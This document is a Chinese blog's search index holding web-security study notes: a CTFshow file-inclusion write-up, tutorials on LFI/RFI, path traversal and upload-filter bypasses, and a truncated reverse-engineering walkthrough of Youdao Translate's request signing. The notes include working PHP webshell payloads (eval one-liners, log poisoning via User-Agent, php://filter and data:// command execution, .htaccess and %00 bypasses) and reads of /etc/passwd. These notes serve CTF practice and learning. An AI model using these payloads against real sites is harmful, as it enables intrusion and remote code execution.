<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件包含题目</title>
      <link href="/post/20250303125329.html"/>
      <url>/post/20250303125329.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m0_46467017/article/details/126380415">全面详细解释</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="webshow"><a href="#webshow" class="headerlink" title="webshow"></a>webshow</h2><h3 id="78"><a href="#78" class="headerlink" title="78"></a>78</h3><ul><li>data伪协议（推荐，可以使用ls命令查看flag位置）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure></li><li>fliter伪协议(不推荐，不知道flag在哪时不好用）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></li><li>日志包含（推荐，伟大无需多言）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">&lt;?php eval($_POST[a]); ?&gt; //这个通过http参数传入</span><br></pre></td></tr></table></figure></li></ul><h3 id="79"><a href="#79" class="headerlink" title="79"></a>79</h3><p>php 被过滤</p><h4 id="使用大小写混用绕过"><a href="#使用大小写混用绕过" class="headerlink" title="使用大小写混用绕过"></a>使用大小写混用绕过</h4><hr><p><code>?file=data://text/plain,&lt;?PhP system(&#39;ls&#39;);?&gt; </code>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?PhP system('tac flag*');?></p><hr><p><code>?file=PhP://input post传入</code><?PhP system('ls');?><br><code>?file=PhP://input post传入</code><?PhP system('tac flag*');?></p><h4 id="data协议-base64加密"><a href="#data协议-base64加密" class="headerlink" title="data协议 base64加密"></a>data协议 base64加密</h4><p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</code></p><h3 id="80-81"><a href="#80-81" class="headerlink" title="80 &#x2F;81"></a>80 &#x2F;81</h3><p>日志包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: f4b0f15c-aa0c-4c28-92c9-994ade1af812.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&lt;?php eval($_GET[2]);?&gt; //注入</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><p><code>?file=/var/log/nginx/access.log&amp;&amp;2=system(&#39;tac /var/www/html/fl0g.php&#39;);</code>然后直接执行(先ls)<br><font color="#c00000">大小写绕过 用bp post必须是</font><br><code>?file=PhP://input post传入</code><?PhP system('ls');?><br><code>?file=PhP://input post传入</code><?PhP system('tac flag*');?></p><h3 id="82-86条件竞争漏洞"><a href="#82-86条件竞争漏洞" class="headerlink" title="82-86条件竞争漏洞"></a>82-86条件竞争漏洞</h3><p><a href="https://www.freebuf.com/articles/web/275557.html">https://www.freebuf.com/articles/web/275557.html</a><br><a href="https://xz.aliyun.com/news/10110">https://xz.aliyun.com/news/10110</a></p><h3 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87- php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87- php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h3><p>由于文件中有个自己的url解码 所以一次浏览器 一次代码<br>1、利用base64:<br>ur1编码2次：<br>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php<br><code>content=&lt;?php @eval($_POST[1]);?&gt; 的base64编码</code> 然后需要前面补aa 占位1字节<br>2、利用凯散13<br>url编码2次：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;shell.php<br>&#96;content&#x3D;<?cuc @riny($_TRG[1]);?></p><h3 id="88-data伪协议过滤"><a href="#88-data伪协议过滤" class="headerlink" title="88-data伪协议过滤"></a>88-data伪协议过滤</h3><p><code>data://text/plain;base64,后面base64不能出现等号所以需要自己凑</code><br>PD9waHAgc3lzdGVtKCdscycpOzE&#x2F;PjEy  来执行ls<br>PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs&#x2F;PjEx tac flag</p><h3 id="117-php-fi1ter-write-新的算法"><a href="#117-php-fi1ter-write-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;fi1ter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;fi1ter&#x2F;write&amp;新的算法</h3><p>convert.iconv.:一种过滤器，和使用iconv（）函数处理流数据有等同作用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span> (<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;经过一次反转：&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;经过第二次反转：&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload :<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;shell.php<br><code>contents=?&lt;hp pe@av(l_$EG[T]1;)&gt;?</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含以及前后台</title>
      <link href="/post/20250303125202.html"/>
      <url>/post/20250303125202.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://imgse.com/i/pEnHbLt"><img src="https://s21.ax1x.com/2025/02/11/pEnHbLt.png" alt="pEnHbLt.png"></a></p><h1 id="PHP-应用-文件包含-LFI-RFI-伪协议编码算法-无文件利用-黑白盒"><a href="#PHP-应用-文件包含-LFI-RFI-伪协议编码算法-无文件利用-黑白盒" class="headerlink" title="PHP 应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒"></a>PHP 应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒</h1><h2 id="文件包含-原理-分类-利用-修复"><a href="#文件包含-原理-分类-利用-修复" class="headerlink" title="文件包含-原理&amp;分类&amp;利用&amp;修复"></a>文件包含-原理&amp;分类&amp;利用&amp;修复</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞<br>1.1、分类<br>本地包含-Local File Include-LFI<br>远程包含-Remote File Include-RFI<br>差异原因：代码过滤和环境配置文件开关决定</p><h3 id="2、白盒审计：（CTFSHOW）"><a href="#2、白盒审计：（CTFSHOW）" class="headerlink" title="2、白盒审计：（CTFSHOW）"></a>2、白盒审计：（CTFSHOW）</h3><p>-白盒发现：<br>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等<br>PHP：include、require、include_once、require_once 等<br>include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require 函数出现错误的时候，会直接报错并退出程序的执行<br>Java：java.io.File、java.io.FileReader 等<br>ASP.NET：System.IO.FileStream、System.IO.StreamReader 等</p><h3 id="3、黑盒分析："><a href="#3、黑盒分析：" class="headerlink" title="3、黑盒分析："></a>3、黑盒分析：</h3><p>-黑盒发现：主要观察参数传递的数据和文件名是否对应<br>URL 中有 path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</p><h3 id="4、利用"><a href="#4、利用" class="headerlink" title="4、利用"></a>4、利用</h3><p>本地利用思路：<br>1、配合文件上传<br>2、无文件包含日志<br>3、无文件包含 SESSION<br>4、无文件支持伪协议利用<br>参考：<br><a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p><h3 id="文件读取："><a href="#文件读取：" class="headerlink" title="-文件读取："></a>-文件读取：</h3><p>·file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</p><h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="-文件写入："></a>-文件写入：</h3><p>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</p><p>post content&#x3D;<br>&#96;php:&#x2F;&#x2F;input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($GET [cmd]);?>‘</p><h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p><code>php://input POST:&lt;?phph phpinfo();?&gt; </code>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?><br>&#96;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaw5mbygp0z832b<br>远程利用思路：<br>直接搭建一个可访问的远程URL包含文件<br>5、修复见网上参考</p><h2 id="黑盒利用-VULWEB-有无包含文件"><a href="#黑盒利用-VULWEB-有无包含文件" class="headerlink" title="黑盒利用-VULWEB-有无包含文件"></a>黑盒利用-VULWEB-有无包含文件</h2><p>&#96;<a href="http://testphp.vulnweb.com/showimage.php?file=index.php">http://testphp.vulnweb.com/showimage.php?file=index.php</a></p><h2 id="白盒-ctfshow"><a href="#白盒-ctfshow" class="headerlink" title="白盒 -ctfshow"></a>白盒 -ctfshow</h2><p>[[WEB&#x2F;php&#x2F;文件包含|文件包含]] ctfshow题目 </p><h1 id="前后台功能点-文件下载-文件读取-文件删除-目录遍历-目录穿越"><a href="#前后台功能点-文件下载-文件读取-文件删除-目录遍历-目录穿越" class="headerlink" title="前后台功能点&amp;文件下载&amp;文件读取&amp;文件删除&amp;目录遍历&amp;目录穿越"></a>前后台功能点&amp;文件下载&amp;文件读取&amp;文件删除&amp;目录遍历&amp;目录穿越</h1><h2 id="文件安全-下载-删除-黑白盒"><a href="#文件安全-下载-删除-黑白盒" class="headerlink" title="文件安全-下载&amp;删除-黑白盒"></a>文件安全-下载&amp;删除-黑白盒</h2><p>1、下载&#x3D;读取<br>常规下载 URL： <a href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a><br>可能存在安全 URL： <a href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a><br>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）<br>eg ..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>2、文件删除（常出现后台中）<br>可能存在安全问题：前台或后台有删除功能应用<br>利用：常规删除重装锁定配合程序重装或高危操作<br>3、文件编辑安全</p><h2 id="目录安全-遍历-穿越-黑白盒"><a href="#目录安全-遍历-穿越-黑白盒" class="headerlink" title="目录安全-遍历&amp;穿越-黑白盒"></a>目录安全-遍历&amp;穿越-黑白盒</h2><p>1、目录遍历<br>目录权限控制不当，通过遍历获取到有价值的信息文件去利用<br>2、目录穿越（常出现后台中）<br>目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用</p><h3 id="黑盒分析："><a href="#黑盒分析：" class="headerlink" title="黑盒分析："></a>黑盒分析：</h3><p>1、功能点<br>文件上传，文件下载，文件删除，文件管理器等地方<br>2、URL 特征<br>文件名：<br>download，down，readfile，read，del，dir，path，src，Lang 等<br>参数名：<br>file、path、data、filepath、readfile、data、url、realpath 等</p><h3 id="白盒分析："><a href="#白盒分析：" class="headerlink" title="白盒分析："></a>白盒分析：</h3><p>上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/post/20250213215859.html"/>
      <url>/post/20250213215859.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://imgse.com/i/pEeYv4I"><img src="https://s21.ax1x.com/2025/02/05/pEeYv4I.png" alt="pEeYv4I.png"></a></p><h1 id="PHP-应用-文件上传-函数缺陷-条件竞争-二次渲染-黑白名单-JS-绕过"><a href="#PHP-应用-文件上传-函数缺陷-条件竞争-二次渲染-黑白名单-JS-绕过" class="headerlink" title="PHP 应用&amp;文件上传&amp;函数缺陷&amp;条件竞争&amp;二次渲染&amp;黑白名单&amp;JS 绕过"></a>PHP 应用&amp;文件上传&amp;函数缺陷&amp;条件竞争&amp;二次渲染&amp;黑白名单&amp;JS 绕过</h1><h2 id="学习前必读："><a href="#学习前必读：" class="headerlink" title="学习前必读："></a>学习前必读：</h2><p>1、课前一定要明白：<br>无文件解析安全问题上，格式解析是一对一的（不能 jpg 解析 php）<br>换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析<br>2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！</p><h3 id="测试环境安装参考："><a href="#测试环境安装参考：" class="headerlink" title="测试环境安装参考："></a>测试环境安装参考：</h3><p><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a><br><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p><p>0、下载上述资源<br>1、docker 安装<br>f8x -d 或 f8x -docker<br>2、进入项目文件夹<br>cd upload-labs-docker<br>3、一键部署运行<br>docker-compose up -d</p><h2 id="upload-labs-docker-知识点："><a href="#upload-labs-docker-知识点：" class="headerlink" title="upload-labs-docker 知识点："></a>upload-labs-docker 知识点：</h2><p>1、前端 JS<br>如何判断是否是前端验证呢？ <font color="#ff0000">看源码</font><br>首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了<br>绕过就是 ： jpg上穿  抓包然后改成php<br>2、.htaccess (这是apache的配置文件)<br>抓包配置 .htaccess<br>内容添加：<br>AddType application&#x2F;x-httpd-php .png  # 借助这个配置让.png的命名文件当做类型application&#x2F;x-httpd-php执行 (php的类型)<br>然后再上传png 图片码<br>3、MIME 类型<br>Content-Type：image&#x2F;png<br>Content-Type:application&#x2F;octet-stream<br>通过此文件头来判断文件类型 来过滤，直接抓包修改jpg为php即可<br>4、文件头判断<br>GIF89a 写在php文件中头部<br>5、黑名单判断<br>无递归绕过 ：修改后缀.phpphp 即可绕过为php<br>改成大小写绕过也可以 windows不区分<br>6、 php版本低于5.3.4<br>url上面抓包显示到有road&#x3D;&#x2F;var&#x2F;www&#x2F;upload<br>加上a.php%00 来截断他的上传 使得上传的jpg变成php</p><p>post下面 有路径 截断需要 自己手工解码 %00<br>7、 黑名单限制上传类型 过滤不严<br>fuzzb 直接跑字典后缀<br>8、逻辑不严谨-条件竞争<br>先上传 后面判断 处理逻辑<br>访问即创建代码搞出来（访问了自动触发代码新建一个文件写入后台）<br><code>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1];?)</code><br>上传&#x2F;访问 两个请求 不断发包 然后网页访问<br>9、二次渲染<br>先搞个正常图片，上传导出渲染后的图片<br>对比保留部分，在保留部分添加后门代码<br>最后利用提示的文件包含执行图片后门代码<br>10、函数缺陷<br>move_uploaded_file 1.php&#x2F;. 来重命名<br>11、代码审计_数组绕过<br>-174283082921961<br>&#96;Content-Disposition: form-data; name-“save_name[0]”</p><p>·<a href="http://2.php/">http://2.php/</a><br>-174283082921961<br>&#96;Content-Disposition: form-data; name “save_name[2]”</p><h1 id="PHP-应用-文件上传-中间件-CVE-解析-第三方编辑器-已知-CMS-漏-洞"><a href="#PHP-应用-文件上传-中间件-CVE-解析-第三方编辑器-已知-CMS-漏-洞" class="headerlink" title="PHP 应用&amp;文件上传&amp;中间件 CVE 解析&amp;第三方编辑器&amp;已知 CMS 漏 洞"></a>PHP 应用&amp;文件上传&amp;中间件 CVE 解析&amp;第三方编辑器&amp;已知 CMS 漏 洞</h1><h2 id="PHP-中间件-上传相关-Apache-Nginx"><a href="#PHP-中间件-上传相关-Apache-Nginx" class="headerlink" title="PHP-中间件-上传相关-Apache&amp;Nginx"></a>PHP-中间件-上传相关-Apache&amp;Nginx</h2><p>复现漏洞环境：vulhub （ <a href="https://vulhub.org/">https://vulhub.org/</a> ）<br>由于 PHP 搭建常用中间件：IIS，Apache，Nginx<br>Web 搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传</p><h2 id="PHP-编辑器-上传相关-第三方处理引用"><a href="#PHP-编辑器-上传相关-第三方处理引用" class="headerlink" title="PHP-编辑器-上传相关-第三方处理引用"></a>PHP-编辑器-上传相关-第三方处理引用</h2><p>复现漏洞环境：ueditor<br>由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路<br>参考： <a href="https://cloud.tencent.com/developer/article/2200036">https://cloud.tencent.com/developer/article/2200036</a><br>参考： <a href="https://blog.csdn.net/qq_45813980/article/details/126866682">https://blog.csdn.net/qq_45813980/article/details/126866682</a><br>引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全<br>PHP-CMS 源码-上传相关-已知识别到利用<br>复现漏洞环境：通达 OA-V11.2<br>从未知的源码体系测试原生态上传安全，现在是已知 CMS 源码架构，利用已知的漏洞测试</p><h1 id="文件上传-存储安全-OSS-对象-分站-解析安全-解码还原-目录执行"><a href="#文件上传-存储安全-OSS-对象-分站-解析安全-解码还原-目录执行" class="headerlink" title="文件上传&amp;存储安全&amp;OSS 对象&amp;分站&amp;解析安全&amp;解码还原&amp;目录执行"></a>文件上传&amp;存储安全&amp;OSS 对象&amp;分站&amp;解析安全&amp;解码还原&amp;目录执行</h1><h2 id="文件-解析方案-执行权限-解码还原"><a href="#文件-解析方案-执行权限-解码还原" class="headerlink" title="文件-解析方案-执行权限&amp;解码还原"></a>文件-解析方案-执行权限&amp;解码还原</h2><p>1、执行权限<br>文件上传后存储目录不给执行权限<br>2、解码还原 比如图片固定base64解析<br>数据做存储，解析固定（文件后缀名无关）<br>文件上传后利用编码传输解码还原</p><h2 id="文件-存储方案-分站存储-OSS-对象"><a href="#文件-存储方案-分站存储-OSS-对象" class="headerlink" title="文件-存储方案-分站存储&amp;OSS 对象"></a>文件-存储方案-分站存储&amp;OSS 对象</h2><p>1、分站存储<br>upload.xiaodi8.com 上传<br>images.xiaodi8.com 存储<br>2、OSS 对象<br>Access 控制-OSS 对象存储-Bucket 对象</p><h2 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h2><p>实例分析判断</p><h3 id="安全绕过"><a href="#安全绕过" class="headerlink" title="安全绕过"></a>安全绕过</h3><p>以上方案除目录设置权限如能换目录解析绕过外，其他均无解</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>有道翻译js漏洞</title>
      <link href="/post/20250202104000.html"/>
      <url>/post/20250202104000.html</url>
      
        <content type="html"><![CDATA[<p>在有道的单词翻译界面，输入一个单词进行请求，然后观察网络发包，通过检查发现webtranslate是请求的具体实现，但是前端js代码被混淆，现在开始突破：</p><h2 id="开始大体了解"><a href="#开始大体了解" class="headerlink" title="开始大体了解"></a>开始大体了解</h2><p><a href="https://blog.csdn.net/ningmengban/article/details/118738013">一个csdn的讲解来更好学习cURL</a><br>所以 过滤器用的选Fetch&#x2F;XHR 然后看的是<font color="#ff0000">载荷与启动器</font><a href="https://imgse.com/i/pAf0NWt"><img src="https://s21.ax1x.com/2024/11/23/pAf0NWt.png" alt="pAf0NWt.png"></a></p><p>然后观察到参数<code>i</code>是传递的单词<br>复制该请求的cURL(bash) （cmd的无法识别）到该网址(<a href="https://curlconverter.com/">https://curlconverter.com/</a>)中转成pythond代码的网络请求。<br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">补充CURL</a><br><a href="https://imgse.com/i/pAf0aSP"><img src="https://s21.ax1x.com/2024/11/23/pAf0aSP.png" alt="pAf0aSP.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;OUTFOX_SEARCH_USER_ID&#x27;</span>: <span class="string">&#x27;-807195057@112.6.224.59&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;OUTFOX_SEARCH_USER_ID_NCOO&#x27;</span>: <span class="string">&#x27;1295680981.8456256&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UM_distinctid&#x27;</span>: <span class="string">&#x27;1934efa317d26a0-0cf60c63ba6004-26011851-384000-1934efa317e30e9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DICT_DOCTRANS_SESSION_ID&#x27;</span>: <span class="string">&#x27;Nzc1YzdjMTctY2UwYi00MWRkLTljNWMtYmU0ZDZkYmE2YjFl&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_uetsid&#x27;</span>: <span class="string">&#x27;1a0d8b00a87b11efb41e654a51bcff2d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_uetvid&#x27;</span>: <span class="string">&#x27;1a0dc100a87b11efbea5976598c3a68c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_uetmsclkid&#x27;</span>: <span class="string">&#x27;_uet3e4b623b79541aa791a405049652812f&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Cookie&#x27;: &#x27;OUTFOX_SEARCH_USER_ID=-807195057@112.6.224.59; OUTFOX_SEARCH_USER_ID_NCOO=1295680981.8456256; UM_distinctid=1934efa317d26a0-0cf60c63ba6004-26011851-384000-1934efa317e30e9; DICT_DOCTRANS_SESSION_ID=Nzc1YzdjMTctY2UwYi00MWRkLTljNWMtYmU0ZDZkYmE2YjFl; _uetsid=1a0d8b00a87b11efb41e654a51bcff2d; _uetvid=1a0dc100a87b11efbea5976598c3a68c; _uetmsclkid=_uet3e4b623b79541aa791a405049652812f&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-site&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;banana&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;useTerm&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dictResult&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;keyid&#x27;</span>: <span class="string">&#x27;webfanyi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;341027bbf5e4757757192d5cf94ffc62&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;client&#x27;</span>: <span class="string">&#x27;fanyideskweb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;product&#x27;</span>: <span class="string">&#x27;webfanyi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;appVersion&#x27;</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vendor&#x27;</span>: <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pointParam&#x27;</span>: <span class="string">&#x27;client,mysticTime,product&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mysticTime&#x27;</span>: <span class="string">&#x27;1732276669901&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;keyfrom&#x27;</span>: <span class="string">&#x27;fanyi.web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;screen&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;network&#x27;</span>: <span class="string">&#x27;wifi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abtest&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yduuid&#x27;</span>: <span class="string">&#x27;abcdefg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;https://dict.youdao.com/webtranslate&#x27;</span>, cookies=cookies, headers=headers, data=data)</span><br><span class="line"><span class="comment">#加一句</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>对这个代码进行运行<br>1.修改i的值去看能不能翻译 发现不可以<br>2.同时响应内容被加密不能直观读出来</p><h2 id="请求逆向分析"><a href="#请求逆向分析" class="headerlink" title="请求逆向分析"></a>请求逆向分析</h2><p>然后开始找一些变化的量去逆向：对比一下不同词的请求，会发现两处不一样，一个是<code>sign</code> 值，还有一个是<code>mysticTime</code> 值<br><strong>所以猜测是，本地js签名了一个sign值，远程服务器校验了这个sign，导致我们直接修改i的话是无法成功拿到数据的。</strong><br>所以我们的目标是<strong>逆向这两个变化值</strong></p><p>先从webtranslate这个包中的第一个调用堆栈去看<br>在send处打上断点 然后重新请求一下（指输入不同单词），发现该函数的调用堆栈<br><a href="https://imgse.com/i/pAf0tJI"><img 